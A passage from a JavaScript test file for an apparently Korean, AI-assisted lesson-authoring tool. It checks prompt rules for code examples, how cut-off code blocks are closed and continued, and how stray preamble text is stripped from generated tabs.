        assert.ok(build('tab_content', { tabId: 'basicLearn', tabLabel: '기본학습' }).userPrompt.includes(cut));
        assert.ok(build('tab_content_continue', { tabId: 'basicPrac', tabLabel: '기본실습', chunkIndex: 1, previousContent: '앞 글' }).systemInstruction.includes(cut));
        assert.ok(build('module', {}).systemInstruction.includes(cut));
        assert.ok(!source('ui.js').includes('문장 중간에서 끊지 마세요.'), '남은 옛 문구가 없다');
    });

    await run('지시: 검수 수정과 탭 전체 AI 수정도 학습이해도가 아니면 코드 예제 규칙을 받는다', async () => {
        assert.ok(call(ctx, 'reviewSystemPrompt')('basicLearn').includes('[코드 예제 규칙]'));
        assert.ok(call(ctx, 'reviewSystemPrompt')('basicPrac').includes('[코드 예제 규칙]'));
        assert.ok(!call(ctx, 'reviewSystemPrompt')('assessment').includes('[코드 예제 규칙]'));
        const systems = [];
        const mod = { id: 1, title: '차시', tabContents: { basicLearn: '## 본문\n\n원래 글입니다.', assessment: '### 문제 1. 가\n\n원래 문제입니다.' } };
        const aiCtx = generationContext(async (model, payload) => { systems.push(payload.systemInstruction.parts[0].text); return reply('## 본문\n\n보강한 글입니다.'); }, mod);
        answerPreview(aiCtx, 'cancel');
        await call(aiCtx, 'reinforceCurrentTab')(1, '예시 추가');
        vm.runInContext("currentLessonTab = 'assessment';", aiCtx);
        await call(aiCtx, 'reinforceCurrentTab')(1, '예시 추가');
        assert.strictEqual(systems.length, 2);
        assert.ok(systems[0].includes('[코드 예제 규칙]') && !systems[1].includes('[코드 예제 규칙]'));
    });

    /* ---------- 생성 흐름 ---------- */
    await run('탭 생성: 코드 차시를 알리고, 코드 블록 안에서 끊긴 단락은 닫은 뒤 이어 붙인다', async () => {
        const mod = { id: 1, title: 'Python 반복문', tabContents: {} };
        const replies = [
            '## 1. 반복 실습 (⏱ 40분)\n\n반복 예제를 입력합니다.\n\n```python\nfor i in range(3):\n    print(i)\n<!-- CONTINUE -->',
            '## 2. 정리 실습 (⏱ 40분)\n\n입력한 코드를 다시 실행합니다.\n<!-- END -->'
        ];
        const aiCtx = generationContext(async () => reply(replies.shift()), mod);
        const result = await call(aiCtx, 'generateTabContent')(1, 'basicPrac', { quiet: true });
        assert.strictEqual(result.ok, true, JSON.stringify(result));
        assert.strictEqual(aiCtx.taskArgs[0].task, 'tab_content');
        assert.strictEqual(aiCtx.taskArgs[0].args.codeTopic, true);
        assert.strictEqual(aiCtx.taskArgs[1].args.codeTopic, true, '이어쓰기에도 넘긴다');
        const saved = mod.tabContents.basicPrac;
        assert.ok(saved.includes('    print(i)\n```'), saved);
        assert.deepStrictEqual(plain(call(aiCtx, 'lessonCodeSections')(saved).map(section => section.title)), ['1. 반복 실습 (⏱ 40분)', '2. 정리 실습 (⏱ 40분)'], '다음 단락의 제목이 코드 안에 들어가지 않는다');
        assert.ok(!saved.includes('<!--'), saved);
    });

    await run('탭 생성: 언어 없는 펜스로 감싼 응답은 벗기고, 코드 차시가 아니면 codeTopic이 없다', async () => {
        const mod = { id: 1, title: '게임 기획', tabContents: {} };
        const aiCtx = generationContext(async () => reply('```\n## 1. 기획 실습 (⏱ 40분)\n\n기획서를 씁니다.\n<!-- END -->\n```'), mod);
        await call(aiCtx, 'generateTabContent')(1, 'basicPrac', { quiet: true });
        assert.strictEqual(aiCtx.taskArgs[0].args.codeTopic, false);
        assert.ok(mod.tabContents.basicPrac.startsWith('## 1. 기획 실습'), mod.tabContents.basicPrac);
        assert.ok(!mod.tabContents.basicPrac.includes('```'));
    });

    await run('탭 생성: 차시 제목 앞에 붙인 목표·배경 목록과 구분선은 저장하지 않는다', async () => {
        const mod = { id: 1, title: '새 차시', tabContents: {} };
        const answer = ['- 생태계를 개관할 수 있습니다.', '- 사례를 분석할 수 있습니다.', '', '<br>', '', '- 창작의 주체가 이동하고 있습니다.', '',
            '<br><br>', '', '---', '', '<br>', '', '# 📝 새 차시: 생성형 AI 생태계', '', '## 1. 기획 실습 (⏱ 40분)', '', '기획서를 씁니다.', '<!-- END -->'].join('\n');
        const aiCtx = generationContext(async () => reply(answer), mod);
        await call(aiCtx, 'generateTabContent')(1, 'basicPrac', { quiet: true });
        const saved = mod.tabContents.basicPrac;
        assert.ok(saved.startsWith('# 📝 새 차시: 생성형 AI 생태계'), saved.slice(0, 120));
        ['생태계를 개관', '창작의 주체', '---'].forEach(text => assert.ok(!saved.includes(text), text));
    });

    await run('교안 전체 생성: 청크 끝의 코드 블록을 닫는 펜스를 지우지 않고 코드 차시를 알린다', async () => {
        const mod = { id: 7, title: 'Python 합계', description: '반복문으로 합계를 구합니다.', status: 'waiting' };
        const body = [
            '## 학습 목표', '', '- 반복문으로 합계를 구하는 코드를 작성할 수 있습니다.', '',
            '## 개요', '', '- 값을 하나씩 더해야 하는 상황입니다.', '',
            '## ✅ 학습 후 체크리스트', '', '- 합계를 구했습니다. (다시 보기: 1. 합계)', '',
            '## 1. 합계 (⏱ 60분)', '', '합계를 구하는 코드입니다.', '', '```python', 'total = 0', 'for n in [1, 2, 3]:', '    total += n', 'print(total)', '```'
        ].join('\n');
        let calls = 0;
        const aiCtx = generationContext(async () => { calls += 1; return reply(body); }, mod);
        await call(aiCtx, 'generateModuleContent')(7, []);
        assert.strictEqual(calls, 1, '필수 지적이 없어 자동 수정을 부르지 않는다');
        assert.strictEqual(aiCtx.taskArgs[0].task, 'module');
        assert.strictEqual(aiCtx.taskArgs[0].args.codeTopic, true);
        const saved = mod.tabContents.basicLearn;
        assert.ok(saved.includes('    total += n\nprint(total)\n```'), saved);
        assert.ok(call(aiCtx, 'lessonFences')(saved).every(fence => fence.closed), '모든 코드 블록이 닫혀 있다');
        assert.ok(saved.trim().endsWith('(다시 보기: 1. 합계)'), '체크리스트는 맨 끝');
        assert.strictEqual(aiCtx.pipelineCalls.length, 1, '남은 탭 생성으로 이어진다');
    });

    console.log(`\n${count - failed}/${count} passed`);
    if (failed) process.exit(1);
})();
